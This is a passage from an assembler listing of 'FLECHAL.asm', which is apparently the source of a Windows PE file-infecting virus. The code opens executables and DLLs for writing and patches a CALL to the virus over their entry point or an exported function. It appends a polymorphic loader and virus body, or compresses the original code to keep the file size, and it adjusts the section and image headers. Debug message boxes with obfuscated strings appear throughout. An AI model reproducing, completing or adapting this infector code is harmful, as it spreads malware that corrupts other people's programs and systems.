   1456	00000934  E8 00000727		    call _rva_to_va
   1457
   1458	00000939  85 C0			    test eax, eax
   1459	0000093B  0F 84	0000057E	    jz _infect_end_3
   1460
   1461	00000941  50			    push eax
   1462	00000942  6A 05			    push 5
   1463	00000944  50			    push eax
   1464					    callx IsBadReadPtr
1  1465	00000945  E8 00000000e		    call IsBadReadPtr
   1466
   1467	0000094A  85 C0			    test eax, eax
   1468	0000094C  58			    pop	eax
   1469	0000094D  0F 85	0000056C	    jnz	_infect_end_3
   1470
   1471					    ;  EAX points to the code of the first
   1472					    ;  exported	function
   1473
   1474					    ;  now we need to know if
   1475					    ;  we have write access
   1476
   1477	00000953  FF 35	00000F19r	    push _current_fname
   1478	00000959  E8 0000091D		    call _close_file
   1479
   1480					    ;  unload it from memory
   1481
   1482	0000095E  FF 35	000001ACr	    push hWnd_file_infect
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 27
FLECHAL.asm



   1483					    callx FreeLibrary
1  1484	00000964  E8 00000000e		    call FreeLibrary
   1485
   1486	00000969  FF 35	00000F19r	    push _current_fname
   1487	0000096F  E8 000007E0		    call _open_write
   1488
   1489	00000974  85 C0			    test eax, eax
   1490	00000976  0F 84	0000054E	    jz _infect_end_2
   1491
   1492					    ;  we've it...
   1493
   1494	0000097C  8B F8			    mov	edi, eax
   1495
   1496	0000097E  57			    push edi
   1497	0000097F  FF 15	00000158r	    call ImageNtHeader
   1498
   1499	00000985  A3 00000164r		    mov	_image_nt_headers, eax
   1500
   1501	0000098A  85 C0			    test eax, eax
   1502	0000098C  0F 84	00000538	    jz _infect_end_2
   1503
   1504	00000992  FF 35	00002EB8r	    push l_size	;  <---temporary - it'l	be the poly loader size
   1505	00000998  58			    pop	eax
   1506	00000999  03 05	000061C0r	    add	eax, _viral_temp_sz
   1507	0000099F  A3 000001BCr		    mov	_viral_pack_packet_sz, eax
   1508
   1509	000009A4  A1 00000190r		    mov	eax, _infect_lib_rva
   1510	000009A9  8D 04	38		    lea	eax, [eax+edi]
   1511
   1512	000009AC  80 38	E8		    cmp	byte ptr [eax],	0e8h
   1513	000009AF  0F 84	00000515	    je _infect_end_2
   1514
   1515	000009B5  8B 35	00000188r	    mov	esi, _infect_last_section
   1516	000009BB  03 F7			    add	esi, edi
   1517	000009BD  8B 2D	000001A0r	    mov	ebp, _infect_virtual_raw
   1518	000009C3  89 2D	0000013Cr	    mov	_file_size, ebp
   1519	000009C9  8B 46	14		    mov	eax, [esi.SH_PointerToRawData]
   1520	000009CC  03 05	000001BCr	    add	eax, _viral_pack_packet_sz
   1521	000009D2  01 05	0000013Cr	    add	_file_size, eax
   1522
   1523	000009D8  E8 000006A3		    call _re_size
   1524
   1525	000009DD  57			    push edi
   1526	000009DE  FF 15	00000158r	    call ImageNtHeader
   1527
   1528	000009E4  A3 00000164r		    mov	_image_nt_headers, eax
   1529
   1530	000009E9  50			    push eax
   1531	000009EA  57			    push edi
   1532
   1533	000009EB  8B 35	00000188r	    mov	esi, _infect_last_section
   1534	000009F1  03 F7			    add	esi, edi
   1535
   1536	000009F3  89 6E	08		    mov	[esi.SH_VirtualSize], ebp
   1537	000009F6  89 6E	10		    mov	[esi.SH_SizeOfRawData],	ebp
   1538
   1539	000009F9  55			    push ebp
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 28
FLECHAL.asm



   1540
   1541	000009FA  03 6E	0C		    add	ebp, [esi.SH_VirtualAddress]
   1542	000009FD  89 2D	0000018Cr	    mov	_infect_flechal_rva, ebp
   1543	00000A03  89 2D	00002DA6r	    mov	_loader_memory_protect?_dif, ebp
   1544
   1545	00000A09  5D			    pop	ebp
   1546	00000A0A  03 6E	14		    add	ebp, [esi.SH_PointerToRawData]
   1547
   1548					    ;  saving virus VA
   1549
   1550	00000A0D  55			    push ebp
   1551
   1552	00000A0E  A1 00000190r		    mov	eax, _infect_lib_rva
   1553
   1554	00000A13  8D 34	38		    lea	esi, [eax+edi]
   1555	00000A16  BF 00002C35r		    mov	edi, offset _infect_orig_bytes	;						    +
   1556					 **************************************************************************
   1557	00000A1B  A5			    movsd
   1558	00000A1C  A4			    movsb
   1559
   1560					    ;  original	bytes'r	safe, installing "CALL VIRUS"
   1561
   1562	00000A1D  B9 00000005		    mov	ecx, 5
   1563	00000A22  2B F9			    sub	edi, ecx
   1564	00000A24  2B F1			    sub	esi, ecx
   1565	00000A26  03 C1			    add	eax, ecx
   1566	00000A28  8B 0D	0000018Cr	    mov	ecx, _infect_flechal_rva
   1567	00000A2E  2B C8			    sub	ecx, eax
   1568	00000A30  8B FE			    mov	edi, esi
   1569	00000A32  B0 E8			    mov	al, 0e8h
   1570	00000A34  AA			    stosb
   1571	00000A35  8B C1			    mov	eax, ecx
   1572	00000A37  AB			    stosd
   1573
   1574					    ;  ok, we need to add a loader to this file
   1575
   1576	00000A38  8B 1D	00000188r	    mov	ebx, _infect_last_section
   1577	00000A3E  03 1D	00000150r	    add	ebx, hWnd_MapViewOfFile
   1578	00000A44  8B 0D	00000164r	    mov	ecx, _image_nt_headers
   1579
   1580	00000A4A  FF 73	08		    push [ebx.SH_VirtualSize]
   1581	00000A4D  FF 71	38		    push [ecx.IMAGE_NT_HEADERS.OptionalHeader.SectionAlignment]
   1582	00000A50  E8 00000646		    call _re_align
   1583
   1584	00000A55  50			    push eax
   1585	00000A56  50			    push eax
   1586	00000A57  8F 43	08		    pop	[ebx.SH_VirtualSize]
   1587	00000A5A  8F 05	00002D7Br	    pop	_section_size
   1588
   1589	00000A60  FF 73	10		    push [ebx.SH_SizeOfRawData]
   1590	00000A63  FF 71	3C		    push [ecx.IMAGE_NT_HEADERS.OptionalHeader.FileAlignment]
   1591	00000A66  E8 00000630		    call _re_align
   1592
   1593	00000A6B  50			    push eax
   1594	00000A6C  8F 43	10		    pop	[ebx.SH_SizeOfRawData]
   1595
   1596	00000A6F  5F			    pop	edi
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 29
FLECHAL.asm



   1597	00000A70  03 3D	00000150r	    add	edi, hWnd_MapViewOfFile
   1598	00000A76  BE 000029ACr		    mov	esi, offset l_start ;  <---temporary - start of	poly code
   1599	00000A7B  8B 0D	00002EB8r	    mov	ecx, l_size   ;	 <---temporary - poly code
   1600	00000A81  F3> A4		    rep	movsb
   1601
   1602	00000A83  BE 000061C4r		    mov	esi, offset _viral_temp_buffer_1   ;  <---temporary - _viral_pack_packet_addr
   1603	00000A88  8B 0D	000061C0r	    mov	ecx, _viral_temp_sz ; <--temporary _viral_pack_packet_sz
   1604	00000A8E  F3> A4		    rep	movsb
   1605
   1606					    ;  updating	section	/ Image	Size
   1607
   1608	00000A90  5F			    pop	edi
   1609	00000A91  5E			    pop	esi
   1610
   1611	00000A92  8B 5B	08		    mov	ebx, [ebx.SH_VirtualSize]
   1612	00000A95  01 5E	50		    add	[esi.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage], ebx
   1613
   1614	00000A98  60			    pushad
   1615					    x_push eax,	DONE~
1  1616								 x_push_first eax
2  1617	00000A99  33 C0						 xor	 eax, eax
3  1618									 x_push_next q,eax,j
4  1619	00000A9B  2D 87868600					 sub	 eax, _reg - j
4  1620	00000AA0  50						 push	 eax
3  1621									 x_push_next q,eax,j
4  1622	00000AA1  35 3D373544					 xor	 eax, _reg xor j
4  1623	00000AA6  50						 push	 eax
1  1624	00000AA7  8B C4						 mov eax, esp
   1625	00000AA9  6A 00	50 50 6A 00	    push 0 eax eax 0
   1626	00000AAF  FF 15	00002EBCr	    call [MessageBoxA]
   1627					    x_pop
1  1628	00000AB5  8D 64	24 08					 lea	 esp, [esp + _xsize]
   1629	00000AB9  61			    popad
   1630
   1631	00000ABA  E9 0000040B		    jmp	_infect_end_2
   1632
   1633	00000ABF			    _valid_entry_point:
   1634
   1635					    ;  export directory	found
   1636					    ;  sfc protection not found
   1637					    ;  entry point found (maybe	.DLL/.OCX file)
   1638
   1639					    ;  we've to	try to infect this file	replacing 5 first bytes	at the entry-point (we	    +
   1640					 cannot	damage an exported
   1641					    ;  function	compressing it)
   1642
   1643					    ;  infection flag -	1
   1644
   1645	00000ABF  90			    nop
   1646
   1647	00000AC0  C6 05	00002B34r 01	    mov	_infect_mode_1,	1
   1648
   1649	00000AC7  60			    pushad
   1650					    x_push eax,	INFECT|MD|1~
1  1651								 x_push_first eax
2  1652	00000AC8  33 C0						 xor	 eax, eax
3  1653									 x_push_next q,eax,j
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 30
FLECHAL.asm



4  1654	00000ACA  2D FFCEDFBC					 sub	 eax, _reg - j
4  1655	00000ACF  50						 push	 eax
3  1656									 x_push_next q,eax,j
4  1657	00000AD0  35 4D117407					 xor	 eax, _reg xor j
4  1658	00000AD5  50						 push	 eax
3  1659									 x_push_next q,eax,j
4  1660	00000AD6  05 F825FA06					 add	 eax, j	- _reg
4  1661	00000ADB  50						 push	 eax
1  1662	00000ADC  8B C4						 mov eax, esp
   1663	00000ADE  6A 00	50 50 6A 00	    push 0 eax eax 0
   1664	00000AE4  FF 15	00002EBCr	    call [MessageBoxA]
   1665					    x_pop
1  1666	00000AEA  8D 64	24 0C					 lea	 esp, [esp + _xsize]
   1667	00000AEE  61			    popad
   1668
   1669	00000AEF  FF 35	00000168r	    push _infect_entry_point
   1670	00000AF5  E8 00000566		    call _rva_to_va
   1671
   1672	00000AFA  8B F0			    mov	esi, eax
   1673
   1674	00000AFC  85 C0			    test eax, eax
   1675	00000AFE  0F 84	000003C6	    jz _infect_end_2
   1676
   1677	00000B04  A1 0000016Cr		    mov	eax, _infect_EP_section
   1678
   1679	00000B09  85 C0			    test eax, eax
   1680	00000B0B  0F 84	000003B9	    jz _infect_end_2
   1681
   1682	00000B11  03 C7			    add	eax, edi
   1683
   1684	00000B13  FF 70	08		    push [eax.SH_VirtualSize]
   1685	00000B16  8F 05	00002C18r	    pop	_replaced_api_section_sz
   1686
   1687	00000B1C  FF 70	0C		    push [eax.SH_VirtualAddress]
   1688	00000B1F  8F 05	00002D89r	    pop	_replaced_api_section
   1689
   1690	00000B25  57			    push edi
   1691
   1692	00000B26  BF 00002C35r		    mov	edi, offset _infect_orig_bytes	;						    +
   1693					 **************************************************************************
   1694	00000B2B  B9 00000005		    mov	ecx, 5
   1695	00000B30  A4			    movsb
   1696	00000B31  A5			    movsd
   1697
   1698	00000B32  5F			    pop	edi
   1699	00000B33  50			    push eax
   1700	00000B34  E8 000003FD		    call _check_know_section
   1701	00000B39  0F 85	0000038B	    jnz	_infect_end_2
   1702
   1703					    ;  ok, let's ...
   1704
   1705	00000B3F  8A 46	FB		    mov	al, byte ptr [esi-5]
   1706	00000B42  2C E8			    sub	al, 0e8h
   1707	00000B44  0F 84	00000380	    jz _infect_end_2
   1708	00000B4A  2C 01			    sub	al, 0e9h - 0e8h
   1709	00000B4C  0F 84	00000378	    jz _infect_end_2
   1710
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 31
FLECHAL.asm



   1711	00000B52  8B 2D	00000188r	    mov	ebp, _infect_last_section
   1712	00000B58  03 EF			    add	ebp, edi
   1713
   1714	00000B5A  FF 35	00000F19r	    push _current_fname
   1715	00000B60  E8 00000716		    call _close_file
   1716
   1717	00000B65  FF 35	00000F19r	    push _current_fname
   1718	00000B6B  E8 000005E4		    call _open_write
   1719
   1720	00000B70  85 C0			    test eax, eax
   1721	00000B72  0F 84	00000352	    jz _infect_end_2
   1722
   1723					    ;  EBP - last section header
   1724
   1725	00000B78  A1 000001A0r		    mov	eax, _infect_virtual_raw
   1726	00000B7D  03 45	0C		    add	eax, [ebp.SH_VirtualAddress]
   1727
   1728					    ;  RVA virus
   1729
   1730	00000B80  A3 00002DA6r		    mov	_loader_memory_protect?_dif, eax
   1731
   1732	00000B85  FF 35	0000018Cr	    push _infect_flechal_rva
   1733	00000B8B  8F 05	0000013Cr	    pop	_file_size
   1734
   1735	00000B91  E8 00000387		    call _poly_fields
   1736
   1737	00000B96  01 05	0000013Cr	    add	_file_size, eax
   1738
   1739	00000B9C  E8 000004DF		    call _re_size
   1740
   1741	00000BA1  85 FF			    test edi, edi
   1742	00000BA3  0F 84	00000321	    jz _infect_end_2
   1743
   1744	00000BA9  57			    push edi
   1745	00000BAA  FF 15	00000158r	    call ImageNtHeader
   1746
   1747	00000BB0  A3 00000164r		    mov	_image_nt_headers, eax
   1748	00000BB5  8B F0			    mov	esi, eax
   1749
   1750	00000BB7  85 C0			    test eax, eax
   1751	00000BB9  0F 84	0000030B	    jz _infect_end_2
   1752
   1753	00000BBF  8B 1D	00000188r	    mov	ebx, _infect_last_section
   1754	00000BC5  03 DF			    add	ebx, edi
   1755	00000BC7  57			    push edi
   1756
   1757	00000BC8  FF 35	000001A0r	    push _infect_virtual_raw
   1758	00000BCE  FF 35	000001A0r	    push _infect_virtual_raw
   1759
   1760	00000BD4  8F 43	08		    pop	[ebx.SH_VirtualSize]
   1761	00000BD7  8F 43	10		    pop	[ebx.SH_SizeOfRawData]
   1762
   1763	00000BDA  FF 73	08		    push [ebx.SH_VirtualSize]
   1764	00000BDD  FF 76	38		    push [esi.IMAGE_NT_HEADERS.OptionalHeader.SectionAlignment]
   1765	00000BE0  E8 000004B6		    call _re_align
   1766
   1767	00000BE5  50			    push eax
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 32
FLECHAL.asm



   1768	00000BE6  50			    push eax
   1769
   1770	00000BE7  8F 43	08		    pop	[ebx.SH_VirtualSize]
   1771	00000BEA  8F 05	00002D7Br	    pop	_section_size
   1772
   1773	00000BF0  FF 73	10		    push [ebx.SH_SizeOfRawData]
   1774	00000BF3  FF 76	3C		    push [esi.IMAGE_NT_HEADERS.OptionalHeader.FileAlignment]
   1775	00000BF6  E8 000004A0		    call _re_align
   1776
   1777	00000BFB  50			    push eax
   1778	00000BFC  8F 43	10		    pop	[ebx.SH_SizeOfRawData]
   1779
   1780	00000BFF  FF 35	00000168r	    push _infect_entry_point
   1781	00000C05  E8 00000456		    call _rva_to_va
   1782
   1783	00000C0A  8B F8			    mov	edi, eax
   1784
   1785	00000C0C  A1 00000168r		    mov	eax, _infect_entry_point
   1786	00000C11  83 E8	FB		    sub	eax, -5
   1787	00000C14  8B 0D	000001A0r	    mov	ecx, _infect_virtual_raw
   1788	00000C1A  03 4B	0C		    add	ecx, [ebx.SH_VirtualAddress]
   1789	00000C1D  2B C8			    sub	ecx, eax
   1790	00000C1F  B0 E8			    mov	al, 0e8h
   1791	00000C21  AA			    stosb
   1792	00000C22  8B C1			    mov	eax, ecx
   1793	00000C24  AB			    stosd
   1794
   1795	00000C25  5F			    pop	edi
   1796	00000C26  57			    push edi
   1797
   1798	00000C27  03 3D	0000018Cr	    add	edi, _infect_flechal_rva
   1799	00000C2D  BE 000029ACr		    mov	esi, offset l_start ;  <---temporary - start of	poly code
   1800	00000C32  8B 0D	00002EB8r	    mov	ecx, l_size   ;	 <---temporary - poly code
   1801	00000C38  F3> A4		    rep	movsb	;  00401bdc
   1802
   1803	00000C3A  BE 000061C4r		    mov	esi, offset _viral_temp_buffer_1   ;  <---temporary - _viral_pack_packet_addr
   1804	00000C3F  8B 0D	000061C0r	    mov	ecx, _viral_temp_sz ; <--temporary _viral_pack_packet_sz
   1805	00000C45  F3> A4		    rep	movsb
   1806
   1807	00000C47  5F			    pop	edi
   1808	00000C48  8B 35	00000164r	    mov	esi, _image_nt_headers
   1809
   1810	00000C4E  8B 43	08		    mov	eax, [ebx.SH_VirtualSize]
   1811	00000C51  01 46	50		    add	[esi.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage], eax
   1812
   1813	00000C54  60			    pushad
   1814					    x_push eax,	DONE~
1  1815								 x_push_first eax
2  1816	00000C55  33 C0						 xor	 eax, eax
3  1817									 x_push_next q,eax,j
4  1818	00000C57  2D 87868600					 sub	 eax, _reg - j
4  1819	00000C5C  50						 push	 eax
3  1820									 x_push_next q,eax,j
4  1821	00000C5D  35 3D373544					 xor	 eax, _reg xor j
4  1822	00000C62  50						 push	 eax
1  1823	00000C63  8B C4						 mov eax, esp
   1824	00000C65  6A 00	50 50 6A 00	    push 0 eax eax 0
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 33
FLECHAL.asm



   1825	00000C6B  FF 15	00002EBCr	    call [MessageBoxA]
   1826					    x_pop
1  1827	00000C71  8D 64	24 08					 lea	 esp, [esp + _xsize]
   1828	00000C75  61			    popad
   1829
   1830	00000C76  E9 0000024F		    jmp	_infect_end_2
   1831
   1832	00000C7B			    _no_export:
   1833
   1834	00000C7B  60			    pushad
   1835					    x_push eax,	EXPORT_DIRECTORY_NOT_FOUND~
1  1836								 x_push_first eax
2  1837	00000C7C  33 C0						 xor	 eax, eax
3  1838									 x_push_next q,eax,j
4  1839	00000C7E  2D 87FFBBB2					 sub	 eax, _reg - j
4  1840	00000C83  50						 push	 eax
3  1841									 x_push_next q,eax,j
4  1842	00000C84  35 2D4F0211					 xor	 eax, _reg xor j
4  1843	00000C89  50						 push	 eax
3  1844									 x_push_next q,eax,j
4  1845	00000C8A  05 FF000800					 add	 eax, j	- _reg
4  1846	00000C8F  50						 push	 eax
3  1847									 x_push_next q,eax,j
4  1848	00000C90  35 0D1D010B					 xor	 eax, _reg xor j
4  1849	00000C95  50						 push	 eax
3  1850									 x_push_next q,eax,j
4  1851	00000C96  2D 160CFD0B					 sub	 eax, _reg - j
4  1852	00000C9B  50						 push	 eax
3  1853									 x_push_next q,eax,j
4  1854	00000C9C  35 071A061B					 xor	 eax, _reg xor j
4  1855	00000CA1  50						 push	 eax
3  1856									 x_push_next q,eax,j
4  1857	00000CA2  05 0AF103F3					 add	 eax, j	- _reg
4  1858	00000CA7  50						 push	 eax
1  1859	00000CA8  8B C4						 mov eax, esp
   1860	00000CAA  6A 00	50 50 6A 00	    push 0 eax eax 0
   1861	00000CB0  FF 15	00002EBCr	    call [MessageBoxA]
   1862					    x_pop
1  1863	00000CB6  8D 64	24 1C					 lea	 esp, [esp + _xsize]
   1864	00000CBA  61			    popad
   1865
   1866	00000CBB  83 3D	00000168r 00	    cmp	_infect_entry_point, 0
   1867	00000CC2  0F 84	00000202	    jz _infect_end_2
   1868
   1869					    ;  export directory	not found
   1870					    ;  sfc protection not found
   1871					    ;  entry point found (probably .EXE	file)
   1872
   1873					    ;  we've to	try to infect this file	compressing
   1874					    ;  from the	entry-point to the end of the section
   1875					    ;  keeping the original file size
   1876
   1877					    ;  infection flag -	2
   1878
   1879	00000CC8  90			    nop
   1880
   1881	00000CC9  C6 05	00002B34r 02	    mov	_infect_mode_1,	2
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 34
FLECHAL.asm



   1882
   1883	00000CD0  60			    pushad
   1884					    x_push eax,	INFECT|MD|2~
1  1885								 x_push_first eax
2  1886	00000CD1  33 C0						 xor	 eax, eax
3  1887									 x_push_next q,eax,j
4  1888	00000CD3  2D FFCDDFBC					 sub	 eax, _reg - j
4  1889	00000CD8  50						 push	 eax
3  1890									 x_push_next q,eax,j
4  1891	00000CD9  35 4D127407					 xor	 eax, _reg xor j
4  1892	00000CDE  50						 push	 eax
3  1893									 x_push_next q,eax,j
4  1894	00000CDF  05 F825FA06					 add	 eax, j	- _reg
4  1895	00000CE4  50						 push	 eax
1  1896	00000CE5  8B C4						 mov eax, esp
   1897	00000CE7  6A 00	50 50 6A 00	    push 0 eax eax 0
   1898	00000CED  FF 15	00002EBCr	    call [MessageBoxA]
   1899					    x_pop
1  1900	00000CF3  8D 64	24 0C					 lea	 esp, [esp + _xsize]
   1901	00000CF7  61			    popad
   1902
   1903	00000CF8  FF 35	00000168r	    push _infect_entry_point
   1904	00000CFE  8F 05	00002D81r	    pop	__entry
   1905	00000D04  FF 35	00000168r	    push _infect_entry_point
   1906	00000D0A  8F 05	00002DA6r	    pop	_loader_memory_protect?_dif
   1907
   1908	00000D10  8B 0D	0000016Cr	    mov	ecx, _infect_EP_section
   1909	00000D16  85 C9			    test ecx, ecx
   1910	00000D18  0F 84	000001AC	    jz _infect_end_2
   1911
   1912	00000D1E  03 CF			    add	ecx, edi
   1913	00000D20  8B 41	10		    mov	eax, [ecx.SH_SizeOfRawData]
   1914
   1915	00000D23  3D 00004000		    cmp	eax, 16	* 1024	 ;  min. size
   1916	00000D28  0F 82	0000019C	    jb _infect_end_2
   1917
   1918	00000D2E  8B F1			    mov	esi, ecx
   1919
   1920					    ;  ESI points to the section header	from
   1921					    ;  entrypoint
   1922
   1923	00000D30  8B 0D	00000168r	    mov	ecx, _infect_entry_point
   1924	00000D36  8B 46	0C		    mov	eax, [esi.SH_VirtualAddress]
   1925	00000D39  03 46	10		    add	eax, [esi.SH_SizeOfRawData]
   1926	00000D3C  2B C1			    sub	eax, ecx
   1927
   1928					    ;  enough space to compress	?
   1929
   1930	00000D3E  3D 00004000		    cmp	eax, (16 * 1024)
   1931	00000D43  0F 82	00000181	    jb _infect_end_2
   1932
   1933	00000D49  3D 0007D000		    cmp	eax, (500 * 1024)
   1934	00000D4E  0F 87	00000176	    ja _infect_end_2
   1935
   1936	00000D54  A3 00002C08r		    mov	_mem_total, eax
   1937	00000D59  A3 00000194r		    mov	_infect_compress_space_1, eax
   1938
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 35
FLECHAL.asm



   1939	00000D5E  FF 76	08		    push [esi.SH_VirtualSize]
   1940	00000D61  8F 05	00002D7Br	    pop	_section_size
   1941	00000D67  FF 76	0C		    push [esi.SH_VirtualAddress]
   1942	00000D6A  8F 05	00002D91r	    pop	_loader_memory_protect?
   1943
   1944	00000D70  51			    push ecx
   1945	00000D71  E8 000002EA		    call _rva_to_va
   1946
   1947					    ;  compression starts here
   1948
   1949	00000D76  8B D8			    mov	ebx, eax
   1950
   1951	00000D78  85 C0			    test eax, eax
   1952	00000D7A  0F 84	0000014A	    jz _infect_end_2
   1953
   1954	00000D80  A1 00000194r		    mov	eax, _infect_compress_space_1
   1955	00000D85  05 00001000		    add	eax, 4096
   1956
   1957	00000D8A  50			    push eax
   1958	00000D8B  6A 40			    push 40h
   1959					    callx GlobalAlloc
1  1960	00000D8D  E8 00000000e		    call GlobalAlloc
   1961
   1962	00000D92  A3 0000019Cr		    mov	_infect_compress_addr_1, eax
   1963
   1964	00000D97  85 C0			    test eax, eax
   1965	00000D99  0F 84	0000012B	    jz _infect_end_2
   1966
   1967	00000D9F  6A 00			    push 0
   1968	00000DA1  68 0000C1C4r		    push offset	workmem
   1969	00000DA6  FF 35	00000194r	    push _infect_compress_space_1
   1970	00000DAC  FF 35	0000019Cr	    push _infect_compress_addr_1
   1971	00000DB2  53			    push ebx
   1972	00000DB3  E8 00000681		    call _ap_pack
   1973
   1974	00000DB8  A3 00000198r		    mov	_infect_compress_space_2, eax
   1975
   1976	00000DBD  85 C0			    test eax, eax
   1977	00000DBF  0F 84	000000ED	    jz _infect_end_4
   1978
   1979					    ;  we need to generate a poly loader
   1980					    ;  and adjust some offsets
   1981
   1982	00000DC5  E8 00000153		    call _poly_fields
   1983
   1984	00000DCA  8B 0D	00000194r	    mov	ecx, _infect_compress_space_1	;  size	to pack
   1985
   1986	00000DD0  39 0D	00000198r	    cmp	_infect_compress_space_2, ecx
   1987	00000DD6  0F 87	000000D6	    ja _infect_end_4
   1988
   1989	00000DDC  2B 0D	00000198r	    sub	ecx, _infect_compress_space_2
   1990	00000DE2  3B C8			    cmp	ecx, eax
   1991	00000DE4  0F 82	000000C8	    jb _infect_end_4
   1992
   1993	00000DEA  60			    pushad
   1994					    x_push eax,	try|to|infect|?~
1  1995								 x_push_first eax
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 36
FLECHAL.asm



2  1996	00000DEB  33 C0						 xor	 eax, eax
3  1997									 x_push_next q,eax,j
4  1998	00000DED  2D FFC0DF8C					 sub	 eax, _reg - j
4  1999	00000DF2  50						 push	 eax
3  2000									 x_push_next q,eax,j
4  2001	00000DF3  35 635A461A					 xor	 eax, _reg xor j
4  2002	00000DF8  50						 push	 eax
3  2003									 x_push_next q,eax,j
4  2004	00000DF9  05 05BB0906					 add	 eax, j	- _reg
4  2005	00000DFE  50						 push	 eax
3  2006									 x_push_next q,eax,j
4  2007	00000DFF  35 49591D00					 xor	 eax, _reg xor j
4  2008	00000E04  50						 push	 eax
1  2009	00000E05  8B C4						 mov eax, esp
   2010	00000E07  6A 01			    push 1
   2011	00000E09  50			    push eax
   2012	00000E0A  FF 35	00000F19r	    push _current_fname
   2013	00000E10  6A 00			    push 0
   2014	00000E12  FF 15	00002EBCr	    call [MessageBoxA]
   2015					    x_pop
1  2016	00000E18  8D 64	24 10					 lea	 esp, [esp + _xsize]
   2017	00000E1C  83 F8	02		    cmp	eax, 2
   2018	00000E1F  61			    popad
   2019	00000E20  0F 84	0000008C	    je _infect_end_4
   2020
   2021	00000E26  FF 35	00000F19r	    push _current_fname
   2022	00000E2C  E8 0000044A		    call _close_file
   2023
   2024	00000E31  FF 35	00000F19r	    push _current_fname
   2025	00000E37  E8 00000318		    call _open_write
   2026
   2027	00000E3C  85 C0			    test eax, eax
   2028	00000E3E  74 72			    jz _infect_end_4
   2029
   2030	00000E40  8B F8			    mov	edi, eax
   2031
   2032	00000E42  57			    push edi
   2033	00000E43  FF 15	00000158r	    call ImageNtHeader
   2034
   2035	00000E49  A3 00000164r		    mov	_image_nt_headers, eax
   2036
   2037	00000E4E  85 C0			    test eax, eax
   2038	00000E50  74 60			    jz _infect_end_4
   2039
   2040	00000E52  FF 35	00000168r	    push _infect_entry_point
   2041	00000E58  E8 00000203		    call _rva_to_va
   2042
   2043	00000E5D  57			    push edi
   2044
   2045	00000E5E  FF 35	00002EB8r	    push l_size
   2046	00000E64  59			    pop	ecx
   2047
   2048	00000E65  01 0D	00002C08r	    add	_mem_total, ecx	 ;  <---temporary - poly code
   2049
   2050	00000E6B  8B F8			    mov	edi, eax
   2051	00000E6D  BE 000029ACr		    mov	esi, offset l_start ;  <---temporary - start of	poly code
   2052	00000E72  F3> A4		    rep	movsb
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 37
FLECHAL.asm



   2053
   2054	00000E74  8B 35	0000019Cr	    mov	esi, _infect_compress_addr_1
   2055	00000E7A  8B 0D	00000198r	    mov	ecx, _infect_compress_space_2
   2056	00000E80  F3> A4		    rep	movsb
   2057
   2058	00000E82  BE 000061C4r		    mov	esi, offset _viral_temp_buffer_1   ;  <---temporary - _viral_pack_packet_addr
   2059	00000E87  8B 0D	000061C0r	    mov	ecx, _viral_temp_sz ; <--temporary _viral_pack_packet_sz
   2060	00000E8D  F3> A4		    rep	movsb
   2061
   2062	00000E8F  5F			    pop	edi
   2063
   2064	00000E90  60			    pushad
   2065					    x_push eax,	DONE~
1  2066								 x_push_first eax
2  2067	00000E91  33 C0						 xor	 eax, eax
3  2068									 x_push_next q,eax,j
4  2069	00000E93  2D 87868600					 sub	 eax, _reg - j
4  2070	00000E98  50						 push	 eax
3  2071									 x_push_next q,eax,j
4  2072	00000E99  35 3D373544					 xor	 eax, _reg xor j
4  2073	00000E9E  50						 push	 eax
1  2074	00000E9F  8B C4						 mov eax, esp
   2075	00000EA1  6A 00	50 50 6A 00	    push 0 eax eax 0
   2076	00000EA7  FF 15	00002EBCr	    call [MessageBoxA]
   2077					    x_pop
1  2078	00000EAD  8D 64	24 08					 lea	 esp, [esp + _xsize]
   2079	00000EB1  61			    popad
   2080
   2081	00000EB2			    _infect_end_4:
   2082
   2083	00000EB2  FF 35	0000019Cr	    push _infect_compress_addr_1
   2084					    callx GlobalFree
1  2085	00000EB8  E8 00000000e		    call GlobalFree
   2086
   2087	00000EBD  EB 0B			    jmp	_infect_end_2
   2088
   2089	00000EBF			    _infect_end_3:
   2090
   2091	00000EBF  FF 35	000001ACr	    push hWnd_file_infect
   2092					    callx FreeLibrary
1  2093	00000EC5  E8 00000000e		    call FreeLibrary
   2094
   2095	00000ECA			    _infect_end_2:
   2096
   2097	00000ECA  FF 35	00000154r	    push hWnd_imagehlp
   2098					    callx FreeLibrary
1  2099	00000ED0  E8 00000000e		    call FreeLibrary
   2100
   2101	00000ED5			    _infect_end_1:
   2102
   2103	00000ED5  FF 35	00000F19r	    push _current_fname
   2104	00000EDB  E8 0000039B		    call _close_file
   2105
   2106	00000EE0			    _infect_end:
   2107
   2108	00000EE0  60			    pushad
   2109					    x_push eax,	INFECT|ROUTINE|END~
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 38
FLECHAL.asm



1  2110								 x_push_first eax
2  2111	00000EE1  33 C0						 xor	 eax, eax
3  2112									 x_push_next q,eax,j
4  2113	00000EE3  2D 87FFBBB2					 sub	 eax, _reg - j
4  2114	00000EE8  50						 push	 eax
3  2115									 x_push_next q,eax,j
4  2116	00000EE9  35 3D200100					 xor	 eax, _reg xor j
4  2117	00000EEE  50						 push	 eax
3  2118									 x_push_next q,eax,j
4  2119	00000EEF  05 04341001					 add	 eax, j	- _reg
4  2120	00000EF4  50						 push	 eax
3  2121									 x_push_next q,eax,j
4  2122	00000EF5  35 1B74010C					 xor	 eax, _reg xor j
4  2123	00000EFA  50						 push	 eax
3  2124									 x_push_next q,eax,j
4  2125	00000EFB  2D 0CDA05FA					 sub	 eax, _reg - j
4  2126	00000F00  50						 push	 eax
1  2127	00000F01  8B C4						 mov eax, esp
   2128	00000F03  6A 00	50 50 6A 00	    push 0 eax eax 0
   2129	00000F09  FF 15	00002EBCr	    call [MessageBoxA]
   2130					    x_pop
1  2131	00000F0F  8D 64	24 14					 lea	 esp, [esp + _xsize]
   2132	00000F13  61			    popad
   2133
   2134	00000F14  61			    popad
   2135	00000F15  5D			    pop	ebp
